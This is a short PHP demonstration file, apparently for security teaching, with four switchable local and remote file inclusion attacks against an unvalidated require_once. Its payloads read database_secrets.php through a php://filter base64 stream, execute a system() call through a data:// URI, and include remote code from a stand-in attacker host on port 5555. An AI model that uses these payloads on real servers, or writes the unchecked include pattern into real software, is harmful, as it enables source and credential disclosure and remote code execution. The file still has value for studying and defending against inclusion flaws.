<?php
//This file is for demonstrating several LFI (Local File Inclusion) vulnerabilities with PHP.
//And also, an RFI (Remote file inclusion).

// CHOOSE A PAYLOAD BETWEEN 1 AND 4
$payload = 3;

switch ($payload){
	case 1:
		//LFI #1 : Include server file. Potentially executes code if attacker can upload files on the website (any kind of file will work here).
		//Will work.
		$_GET["evil"] = "uploads/evil.txt.gif";

	break;

	case 2:
		//LFI #2 : Including server file from a base64 stream, which disables PHP execution.
		//Will work and disclose source code after decoding for any server file !

		$_GET["evil"] = "php://filter/convert.base64-encode/resource=database_secrets.php";


	break;

	case 3:
		//RFI #3 : Including arbitrary file from a base64 input.
		//Will work if allow_url_include and allow_url_fopen are activated on server !

		$_GET["evil"] = "data://text/plain;base64,".base64_encode("<?php system('echo Backdoor activated'); ");

	break;

	case 4:
		//RFI #4 : Including any file from a remote place.
		//Will work if allow_url_include and allow_url_fopen are activated on server !

		$_GET["evil"] = "http://evil-secdev:5555/evil.txt.gif";

	break;
}

$file = $_GET["evil"];
require_once($file);


